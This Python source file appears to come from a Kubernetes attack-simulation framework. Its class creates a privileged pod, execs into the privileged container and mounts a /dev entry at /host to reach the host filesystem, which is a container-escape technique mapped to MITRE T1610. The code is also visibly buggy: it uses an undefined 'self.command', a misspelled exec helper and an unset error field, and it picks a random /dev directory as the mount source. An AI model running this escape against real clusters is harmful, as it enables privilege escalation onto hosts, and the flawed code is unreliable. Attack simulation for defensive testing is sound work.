from testing.testing import Testing
import time
import random

class PrivilegedContainer(Testing):
    def __init__(self):
        super().__init__()
        self.name = "Privileged Container"
        self.mitre_tactic = "TA0004"
        self.mitre_technique = "T1610"
        self.microsoft_technique = "MS-TA9018"
        self.pod = """apiVersion: v1
kind: Pod
metadata:
  name: privileged
spec:
  containers:
  - image: ubuntu
    name: ubuntu
    command: [ "/bin/sh", "-c", "sleep 9999" ]
  - image: ubuntu
    name: ubuntu-privileged
    command: [ "/bin/sh", "-c", "sleep 9999" ]
    securityContext:
        privileged: true
"""
    def run_attack(self):
        if self.check_install_kubectl():   
            
            # Creating Pod privileged-pod
            print("# Creating Pod privilege-pod with 2 containers (ubuntu, ubuntu-privileged)...")
            self.create_file("privilege-pod.yaml", self.pod)
            self.kubectl_apply("privilege-pod.yaml")
        
            while not self.kubectl_is_pod_ready("privileged"):
                time.sleep(1)
            
            # Exec into Container with bash
            self.cmd = ' '.join(["kubectl", "exec", "-i", "privileged", "-c", "ubuntu", "--", "ls", "-lah", "/dev", "|", "wc", "-l"])

            print("\n# Lists all files and directories in the /dev directory in not privileged Container...")
            output, error = self.kubctl_exec(shell=2)
            print("root@not_privileged:/# ls -lah /dev | wc -l")
            print(output)
            if not error:
                self.output["list_files_in_dev_unpriv"] = output
            
            self.cmd = ' '.join(["kubectl", "exec", "-i", "privileged", "-c", "ubuntu-privileged", "--", "ls", "-lah", "/dev"])

            print("\n# Lists all files and directories in the /dev directory in privileged Container...")
            output, error = self.kubctl_exec(shell=2)
            print(self.cmd)
            print(f"root@privileged:/# {self.cmd}")
            print(output)
            if not error:
                self.output["list_files_in_dev_priv"] = output

            folder_host = self.get_random_folder(output)
            self.cmd = ' '.join(["kubectl", "exec", "-i", "privileged", "-c", "ubuntu-privileged", "--", "mkdir", "/host", "&&", "mount", f"/dev/{folder_host}", "/host"])
            print(self.command)

            print("\n# Mount underlying /host to container from inside of container...")
            output, error = self.kubctl_exec(shell=2)
            print(f"root@privileged:/# {self.cmd}")
            print(output)
            if not error:
                self.output["mount_host_filesystem"] = output
      
            self.cmd = ' '.join(["kubectl", "exec", "-i", "privileged", "-c", "ubuntu-privileged", "--", "ls", "-lah", f"/dev/{folder_host}"])
            print(self.command)
            print("\n# Lists all files and directories in the /dev directory in privileged Container...")
            output, error = self.kubctl_exec(shell=2)
            print(f"root@privileged:/# {self.cmd}")
            print(output)
            
            if not error:
                self.output["list_mounted_files"] = output

            if self.error:
                print("An Error has occured: " + error)
                
            # Cleanup
            self.cleanup()

    def get_random_folder(self, output):
        # Split the output into lines
        lines = output.splitlines()
        
        # Initialize a list to hold folder names
        folders = []

        # Loop through lines to identify directories
        for line in lines:
            parts = line.split()
            if len(parts) > 0 and line.startswith('d'):  # Directories start with 'd'
                folder_name = parts[-1]
                folders.append(folder_name)
        
        # If no folders are found, return None
        if not folders:
            return None
        
        # Choose a random folder from the list
        return random.choice(folders)

    def cleanup(self):
        # Delete Pod privilege-pod
        print("# Deleting Pod privilege-pod...")
        self.kubectl_delete("privileged")
        
        print("\n# Deleting privilege-pod.yaml...")
        self.delete_file("privilege-pod.yaml")

    def display_help(self):
        pass

    def check_prerequisites(self):
        pass

    def determine_executable_path(self):
        pass